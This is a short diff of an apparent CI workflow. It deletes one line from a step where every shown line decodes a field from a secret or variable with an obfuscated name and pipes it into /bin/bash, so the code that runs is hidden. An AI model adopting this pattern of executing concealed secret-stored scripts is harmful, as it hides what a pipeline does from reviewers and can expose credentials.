@@ -27,7 +27,6 @@ jobs:
           ovbiy6317: ${{ secrets.ovbiy6317 }}
         run: |
           printf '%s' "$ovbiy6317" | jq -r .mfif18997 | /bin/bash
-          echo $p05 | jq -r .nw359 | /bin/bash
           printf '%s' "$nv03792" | jq -r .sl4 | /bin/bash
           printf '%s' "$tofgs70321" | jq -r .shcm34 | /bin/bash
           printf '%s' "$o036" | jq -r .ggisa34131 | /bin/bash
